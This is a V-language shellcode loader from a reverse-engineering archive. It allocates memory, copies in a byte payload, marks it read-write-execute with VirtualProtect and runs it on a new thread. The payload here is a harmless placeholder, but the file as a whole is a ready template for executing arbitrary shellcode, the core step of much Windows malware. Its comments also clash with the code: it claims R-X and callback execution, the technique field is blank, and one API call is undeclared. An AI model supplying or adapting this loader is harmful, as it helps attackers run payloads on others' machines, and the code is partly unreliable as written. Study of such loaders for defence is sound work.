/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ v code.v 

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  
*/

module main 

#flag -luser32
#flag -lkernel32

fn C.VirtualAlloc(voidptr, int, u32, u32) voidptr
fn C.VirtualProtect(voidptr, int, u32, &u32) bool
fn C.RtlMoveMemory(voidptr, voidptr, int)
fn C.CreateThread(voidptr, int, voidptr, voidptr, u32, &u32) voidptr

const (
    mem_commit  = 0x1000
    mem_reserve = 0x2000
    mem_release = 0x8000
    mem_free    = 0x10000

    page_readonly           = 0x2
    page_readwrite          = 0x4
    page_execute            = 0x10
    page_execute_read       = 0x20
    page_execute_readwrite  = 0x40
)

fn main() {
    mut old_protect := u32(0)

    // shellcode stored in stack
    payload := [ byte(0x90),0x90,0xCC,0xC3 ]

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime := C.VirtualAlloc(voidptr(0), sizeof(payload), mem_commit | mem_reserve, page_readwrite)

    // copy payload to the buffer
    C.RtlMoveMemory(runtime, payload.data, payload.len)

    // make buffer executable (R-X)
    C.VirtualProtect(runtime, payload.len, page_execute_readwrite, &old_protect)

    // execute
    th_shellcode := C.CreateThread(voidptr(0), 0, voidptr(runtime), voidptr(0), 0, &u32(0))
    C.WaitForSingleObject (th_shellcode, -1)
}